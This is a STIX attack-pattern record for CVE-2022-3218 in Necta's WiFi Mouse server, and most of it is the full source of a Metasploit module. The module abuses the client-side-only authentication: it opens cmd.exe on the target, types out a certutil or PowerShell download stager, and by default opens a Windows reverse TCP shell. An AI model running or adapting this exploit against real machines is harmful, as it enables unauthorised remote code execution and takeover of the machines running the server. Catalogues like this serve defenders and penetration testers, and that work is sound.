{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9bb9e8ff-b487-4c74-bb1b-b3ee09755b1f",
    "created": "2024-08-14T16:47:25.76846Z",
    "modified": "2024-08-14T16:47:25.768464Z",
    "name": "Wifi Mouse RCE",
    "description": " The WiFi Mouse (Mouse Server) from Necta LLC contains an auth bypass as the authentication is completely implemented entirely on the client side. By utilizing this vulnerability, is possible to open a program on the server (cmd.exe in our case) and type commands that will be executed as the user running WiFi Mouse (Mouse Server), resulting in remote code execution.  Tested against versions 1.8.3.4 (current as of module writing) and 1.8.2.3.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/wifi_mouse_rce.rb",
            "external_id": "wifi_mouse_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-3218"
        },
        {
            "source_name": "reference",
            "url": "http://wifimouse.necta.us/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/H4rk3nz0/PenTesting/blob/main/Exploits/wifi%20mouse/wifi-mouse-server-rce.py"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Exploit::Remote::Tcp\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Wifi Mouse RCE',\n        'Description' => %q{\n          The WiFi Mouse (Mouse Server) from Necta LLC contains an auth bypass as the\n          authentication is completely implemented entirely on the client side. By utilizing\n          this vulnerability, is possible to open a program on the server\n          (cmd.exe in our case) and type commands that will be executed as the user running\n          WiFi Mouse (Mouse Server), resulting in remote code execution.\n\n          Tested against versions 1.8.3.4 (current as of module writing) and\n          1.8.2.3.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'REDHATAUGUST', # edb\n          'H4RK3NZ0' # edb, original discovery\n        ],\n        'References' => [\n          [ 'EDB', '50972' ],\n          [ 'EDB', '49601' ],\n          [ 'CVE', '2022-3218' ],\n          [ 'URL', 'http://wifimouse.necta.us/' ],\n          [ 'URL', 'https://github.com/H4rk3nz0/PenTesting/blob/main/Exploits/wifi%20mouse/wifi-mouse-server-rce.py' ]\n        ],\n        'Arch' => [ ARCH_X64, ARCH_X86 ],\n        'Platform' => 'win',\n        'Targets' => [\n          [\n            'stager',\n            {\n              'CmdStagerFlavor' => ['psh_invokewebrequest', 'certutil']\n            }\n          ],\n        ],\n        'Payload' => {\n          'BadChars' => \"\\x0a\\x00\"\n        },\n        'DefaultOptions' => {\n          # since this may get typed out ON SCREEN we want as small a payload as possible\n          'PAYLOAD' => 'windows/shell/reverse_tcp'\n        },\n        'DisclosureDate' => '2021-02-25',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [SCREEN_EFFECTS, ARTIFACTS_ON_DISK] # typing on screen\n        }\n      )\n    )\n    register_options(\n      [\n        OptPort.new('RPORT', [true, 'Port WiFi Mouse Mouse Server runs on', 1978]),\n        OptInt.new('SLEEP', [true, 'How long to sleep between commands', 1]),\n        OptInt.new('LINEMAX', [true, 'Maximum length of lines to send for stager method.  Smaller for more unstable connections.', 1_020]),\n      ]\n    )\n  end\n\n  def send_return\n    sock.put('key  3RTN') # what the mobile app sends\n  end\n\n  def send_command(command)\n    sock.put(\"utf8 #{command}\\x0A\")\n    sleep(datastore['SLEEP'])\n    send_return\n  end\n\n  def open_file(file)\n    file = \"/#{file}\".gsub('\\\\', '/').gsub(':', '')\n    sock.put(\"openfile #{file}\\x0A\")\n  end\n\n  def exploit\n    connect\n    print_status('Opening command prompt')\n    open_file('C:\\\\Windows\\\\System32\\\\cmd.exe')\n    sleep(datastore['SLEEP']) # give time for it to open\n\n    print_status('Typing out payload')\n    execute_cmdstager({ linemax: datastore['LINEMAX'], delay: datastore['SLEEP'] })\n\n    handler\n  end\n\n  def execute_command(cmd, _opts = {})\n    send_command(cmd)\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-02-25",
    "x_mitre_platforms": [
        "win'"
    ]
}